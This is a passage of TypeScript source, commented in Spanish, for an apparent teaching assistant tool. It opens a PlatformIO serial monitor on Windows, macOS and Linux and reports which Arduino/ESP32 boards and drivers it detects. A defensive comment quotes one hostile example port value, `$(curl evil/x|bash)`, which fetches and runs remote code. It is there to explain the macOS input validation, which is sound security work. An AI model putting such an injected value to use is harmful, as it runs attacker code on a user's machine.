            // varias placas -> elegi el puerto). No lo dupliquemos.
            return `Para abrir el monitor serial primero necesito la placa.\n\n${detected.error}`
          }
          puerto = detected.port
        }

        const pioPath = pioBin()
        // Comando "pelado" listo para copiar y pegar en una terminal (fallback / instrucciones).
        const comandoManual = `${quoteIfNeeded(pioPath)} device monitor --port ${puerto} --baud ${baud}`

        const mensajeExito = `Abri una ventana nueva (negra) con el monitor serial en ${puerto} a ${baud} baudios${origenBaud}. Ahi vas a ver los datos de la placa y podes apretar teclas para comandarla. Para cerrarlo, apreta Ctrl+C en esa ventana.`

        const mensajeManual = `No pude abrir una ventana nueva automaticamente en este equipo, pero es facil hacerlo a mano:

1. Abri una terminal (en Windows busca "cmd"; en Mac/Linux busca "Terminal").
2. Copia y pega este comando, despues apreta Enter:

\`\`\`
${comandoManual}
\`\`\`

Vas a ver los datos de la placa en ${puerto} a ${baud} baudios${origenBaud}. Para cerrarlo, apreta Ctrl+C en esa ventana.`

        // Windows: `start` abre una ventana nueva y vuelve al instante, asi que `run()` no cuelga.
        // El primer argumento entre comillas de `start` es el TITULO de la ventana, por eso va
        // siempre un titulo antes de la ruta de pio (que puede tener espacios, ej: "Maria Jose").
        if (process.platform === "win32") {
          const titulo = `Monitor Serial - ${puerto}`
          const res = await run(
            ["cmd", "/c", "start", titulo, "cmd", "/k", pioPath, "device", "monitor", "--port", puerto, "--baud", String(baud)],
            cwd,
            signal,
          )
          return res.code === 0 ? mensajeExito : mensajeManual
        }

        // Mac: le pedimos a Terminal.app que corra el comando en una ventana nueva via AppleScript.
        if (process.platform === "darwin") {
          /*
           * VALIDACION SOLO ACA, y es a proposito.
           *
           * `puerto` es un string libre (`args.port`, sin restricciones en el
           * schema) que termina interpolado en un AppleScript que Terminal.app
           * corre dentro de un shell POSIX. Ese shell expande `$(...)` AUNQUE
           * este entre comillas dobles — el escape de mas abajo (`replace(/"/g,
           * ...)`) es para el AppleScript, no alcanza para el shell de adentro.
           * Un puerto como `$(curl evil/x|bash)` ejecuta lo que sea en la Mac
           * del docente.
           *
           * Windows (mas abajo) y Linux (mas abajo todavia) arman el comando
           * con ARRAYS reales para `Bun.spawn`, sin shell intermedio: no hay
           * injection que tapar ahi, y agregarles la misma whitelist solo
           * arriesga rechazar un puerto real con una forma que no imaginamos,
           * en las dos plataformas que hoy andan bien. Por eso el chequeo vive
           * solo en la rama que lo necesita.
           */
          if (!puertoValido(puerto)) {
            return (
              `No reconozco ese puerto: \`${puerto}\`.\n\n` +
              "En Mac un puerto real tiene una forma como `/dev/cu.usbserial-14140` o " +
              "`/dev/tty.usbserial-14140`. No lo voy a usar tal cual porque podria no ser " +
              "un puerto — pedime `/diagnostico` para ver los puertos disponibles, o " +
              "decime el puerto correcto."
            )
          }
          const shellCmd = `${quoteIfNeeded(pioPath)} device monitor --port ${quoteIfNeeded(puerto)} --baud ${baud}`
          const escapado = shellCmd.replace(/\\/g, "\\\\").replace(/"/g, '\\"')
          const script = `tell application "Terminal" to do script "${escapado}"`
          return launchDetached(["osascript", "-e", script], cwd) ? mensajeExito : mensajeManual
        }

        // Linux: probamos emuladores de terminal comunes en orden hasta encontrar uno instalado.
        const inner = [pioPath, "device", "monitor", "--port", puerto, "--baud", String(baud)]
        const emuladores: Array<{ bin: string; args: (cmd: string[]) => string[] }> = [
          { bin: "x-terminal-emulator", args: (c) => ["-e", ...c] },
          { bin: "gnome-terminal", args: (c) => ["--", ...c] },
          { bin: "konsole", args: (c) => ["-e", ...c] },
          { bin: "xterm", args: (c) => ["-e", ...c] },
        ]
        for (const emu of emuladores) {
          if (Bun.which(emu.bin) && launchDetached([emu.bin, ...emu.args(inner)], cwd)) {
            return mensajeExito
          }
        }
        return mensajeManual
      }

      case "diagnostico": {
        const pioVersion = await run(["pio", "--version"], cwd, signal)
        const pioOk = pioVersion.code === 0
        const pioText = pioOk ? `OK — ${pioVersion.stdout.trim()}` : "NO encontrado"

        const os = process.platform === "win32" ? "Windows" : process.platform === "darwin" ? "macOS" : "Linux"

        /*
         * ANTES ACÁ SE PEGABA LA SALIDA CRUDA de `pio device list`, y mentía por
         * omisión: en una máquina virtual aparece un COM1 emulado y el reporte
         * decía "dispositivos conectados: COM1". El docente leía todo en verde,
         * intentaba cargar, y fallaba sin entender por qué.
         *
         * Ahora cada puerto se clasifica: cuál es una placa, cuál es un puerto de
         * la propia máquina, y qué driver falta cuando no aparece ninguna.
         */
        let dispositivosText = "No disponible (PlatformIO no instalado)"
        let placas = 0

        if (pioOk) {
          const devResult = await run(["pio", "device", "list", "--json-output"], cwd, signal)
          let devices: Device[] = []
          try {
            devices = JSON.parse(devResult.stdout) as Device[]
          } catch {
            devices = []
          }

          if (devices.length === 0) {
            dispositivosText = "Ninguno — no hay ni siquiera un puerto serie"
          } else {
            dispositivosText = devices
              .map((d) => {
                const q = identificar(d.hwid, d.description)
                if (!q.esPlaca) return `- \`${d.port}\` — no es una placa (${q.motivo})`
                placas++
                const drv = q.driverWindows && os === "Windows" ? ` · driver: ${q.driverWindows}` : ""
                return `- \`${d.port}\` — **placa**, chip ${q.chip} (${q.placa})${drv}`
              })
              .join("\n")
          }
        }

        let estado = placas === 1 ? "Listo para usar" : `Listo — veo ${placas} placas conectadas`
        if (!pioOk) {
          // Sin link a la documentacion oficial: ver pioNoEncontrado(). La
          // reparacion de Tecnia Bot es volver a correr SU instalador.
          estado =
            "Falta instalar PlatformIO. Se arregla con 'Reparar Tecnia Bot', en el menu " +
            "inicio: lo instala solo. NO hay que instalar VS Code " +
            "ni nada aparte. Si aun asi falta, es la red: correr 'Diagnostico de Tecnia Bot'."
        } else if (placas === 0) {
          /*
           * ANTES DE DECIR "no hay nada", PREGUNTARLE A WINDOWS.
           *
           * Sin el driver del CH340 no existe ningún puerto COM, así que
           * PlatformIO no ve nada — pero Windows sí tiene el dispositivo, con un
           * código de error. Decir "no hay ninguna placa" cuando está enchufada
           * manda al docente a revisar el cable durante media hora.
           */
          const d = (await placasSinDriver(cwd, signal))[0]
          if (d) {
            estado =
              `**Hay una placa enchufada, pero Windows no la puede usar.**\n\n` +
              `Ve un \`${d.nombre}\` y ${d.problema}.\n\n` +
              (d.driverWindows
                ? `Bajá el driver de acá: ${d.driverWindows}\n\nInstalalo, desenchufá la placa, volvé a enchufarla y corré \`/diagnostico\` de nuevo.`
                : `Revisá el administrador de dispositivos de Windows para ver qué le falta.`)
          } else {
            const ayuda =
              os === "Windows"
                ? " Si está enchufada y no la veo ni acá ni en Windows, probá otro cable: hay cables USB que sólo llevan corriente y no datos."
                : os === "Linux"
                  ? " Si está enchufada y no aparece, puede ser permiso del puerto: `sudo usermod -a -G dialout $USER` (o `uucp` en Arch/Manjaro), y volvé a iniciar sesión."
                  : ""
            estado = `**Ninguna placa conectada.** Enchufá el Arduino o el ESP32 por USB.${ayuda}`
          }
        }

        return `## Diagnóstico del entorno

**PlatformIO:** ${pioText}

**Sistema operativo:** ${os}

**Puertos que veo:**
${dispositivosText}

**Estado general:** ${estado}`
      }
    }
  },
})
